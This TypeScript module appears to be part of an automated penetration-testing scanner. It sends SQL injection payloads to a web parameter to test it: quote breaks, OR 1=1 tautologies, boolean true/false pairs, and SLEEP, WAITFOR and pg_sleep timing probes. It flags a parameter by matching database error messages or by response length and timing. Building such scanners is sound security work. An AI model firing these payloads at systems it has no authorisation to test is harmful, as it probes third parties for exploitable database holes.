export interface SQLiResult {
  url: string;
  paramName: string;
  vulnerable: boolean;
  technique: string | null;
  payload: string | null;
  evidence: string | null;
  severity: "critical" | "high" | "medium" | "low";
}

const ERROR_PATTERNS = [
  // MySQL
  /you have an error in your sql syntax/i,
  /warning: mysql/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /unclosed quotation mark/i,
  // PostgreSQL
  /pg_query\(\)/i,
  /psql fatal/i,
  /postgresql.*error/i,
  // MSSQL
  /\[microsoft\]\[odbc sql server driver\]/i,
  /unclosed quotation mark after the character string/i,
  /syntax error converting/i,
  // Oracle
  /ora-\d{5}/i,
  /oracle.*error/i,
  // SQLite
  /sqlite_/i,
  /sqlite3/i,
  // Generic
  /sql syntax/i,
  /sql error/i,
  /database error/i,
  /odbc.*driver/i,
];

const ERROR_PAYLOADS = ["'", '"', "1'", "1\"", "' OR '1'='1", "1 OR 1=1", "' OR 1=1--", "\" OR 1=1--"];

const BOOLEAN_PAYLOADS = [
  { true: "1 AND 1=1", false: "1 AND 1=2" },
  { true: "1' AND '1'='1", false: "1' AND '1'='2" },
];

async function makeRequest(
  url: string,
  method: string,
  paramName: string,
  paramValue: string,
  baselineParams: Record<string, string>
): Promise<{ body: string; status: number; timeMs: number } | null> {
  try {
    const controller = new AbortController();
    const start = Date.now();
    setTimeout(() => controller.abort(), 10000);

    const params = { ...baselineParams, [paramName]: paramValue };
    let res: Response;

    if (method === "GET") {
      const qs = new URLSearchParams(params).toString();
      res = await fetch(`${url}?${qs}`, {
        signal: controller.signal,
        headers: { "User-Agent": "AgenticVAPT/1.0 Security Scanner" },
        redirect: "follow",
      });
    } else {
      res = await fetch(url, {
        method: "POST",
        signal: controller.signal,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "AgenticVAPT/1.0 Security Scanner",
        },
        body: new URLSearchParams(params).toString(),
        redirect: "follow",
      });
    }

    const timeMs = Date.now() - start;
    const body = await res.text();
    return { body, status: res.status, timeMs };
  } catch {
    return null;
  }
}

function containsSQLError(body: string): boolean {
  return ERROR_PATTERNS.some((p) => p.test(body));
}

export async function testSQLi(params: {
  url: string;
  method: string;
  paramName: string;
  baselineValue?: string;
  payloads?: string[];
}): Promise<SQLiResult> {
  const { url, method, paramName, baselineValue = "1", payloads } = params;
  const baselineParams = { [paramName]: baselineValue };

  // 1. Get baseline response
  const baseline = await makeRequest(url, method, paramName, baselineValue, {});
  if (!baseline) {
    return { url, paramName, vulnerable: false, technique: null, payload: null, evidence: null, severity: "low" };
  }

  // 2. Error-based detection
  const testPayloads = payloads ?? ERROR_PAYLOADS;
  for (const payload of testPayloads) {
    const res = await makeRequest(url, method, paramName, payload, baselineParams);
    if (!res) continue;
    if (containsSQLError(res.body)) {
      const errorMatch = ERROR_PATTERNS.find((p) => p.test(res.body));
      const errorSnippet = res.body.match(new RegExp(`.{0,100}${errorMatch?.source ?? "sql"}.{0,100}`, "i"))?.[0] ?? "";
      return {
        url,
        paramName,
        vulnerable: true,
        technique: "error-based",
        payload,
        evidence: `SQL error detected in response: ...${errorSnippet}...`,
        severity: "critical",
      };
    }
  }

  // 3. Boolean-based detection
  for (const boolPair of BOOLEAN_PAYLOADS) {
    const trueRes = await makeRequest(url, method, paramName, boolPair.true, baselineParams);
    const falseRes = await makeRequest(url, method, paramName, boolPair.false, baselineParams);

    if (!trueRes || !falseRes) continue;

    const trueLen = trueRes.body.length;
    const falseLen = falseRes.body.length;
    const baseLen = baseline.body.length;

    // True condition should match baseline; false should differ significantly
    const trueMatchesBaseline = Math.abs(trueLen - baseLen) < 50;
    const falseDiffersFromTrue = Math.abs(trueLen - falseLen) > 100;

    if (trueMatchesBaseline && falseDiffersFromTrue) {
      return {
        url,
        paramName,
        vulnerable: true,
        technique: "boolean-based",
        payload: boolPair.true,
        evidence: `Boolean injection: TRUE condition (len=${trueLen}) matches baseline (len=${baseLen}), FALSE condition (len=${falseLen}) differs significantly`,
        severity: "critical",
      };
    }
  }

  // 4. Time-based detection (SLEEP)
  const timePayloads =
    method === "GET"
      ? ["1 AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--", "1 AND pg_sleep(3)--"]
      : ["1' AND SLEEP(3)--", "1'; WAITFOR DELAY '0:0:3'--"];

  for (const payload of timePayloads) {
    const res = await makeRequest(url, method, paramName, payload, baselineParams);
    if (!res) continue;
    if (res.timeMs > 2800) {
      return {
        url,
        paramName,
        vulnerable: true,
        technique: "time-based",
        payload,
        evidence: `Time-based injection: response took ${res.timeMs}ms (>2800ms threshold indicates SLEEP/WAITFOR worked)`,
        severity: "critical",
      };
    }
  }

  return { url, paramName, vulnerable: false, technique: null, payload: null, evidence: null, severity: "low" };
}
